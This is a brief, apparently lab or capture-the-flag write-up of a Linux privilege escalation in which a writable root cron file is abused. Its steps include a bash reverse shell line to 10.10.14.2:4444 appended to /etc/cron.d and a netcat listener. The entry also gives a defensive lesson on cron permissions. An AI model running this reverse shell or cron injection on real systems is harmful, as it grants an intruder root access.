Category: Privilege Escalation (Linux)
Difficulty: Hard

Summary:Found a writable script inside /etc/cron.d that executes every minute as root. By injecting a reverse shell command, I gained root privileges.

Steps:
# Found cronjob via linpeas
ls -la /etc/cron.d
# Edited writable file
echo "* * * * * root bash -i >& /dev/tcp/10.10.14.2/4444 0>&1" >> /etc/cron.d/backup.sh
# Set up listener
nc -lvnp 4444

Lesson: Always check cron permissions and misconfigured scripts in automated jobs.
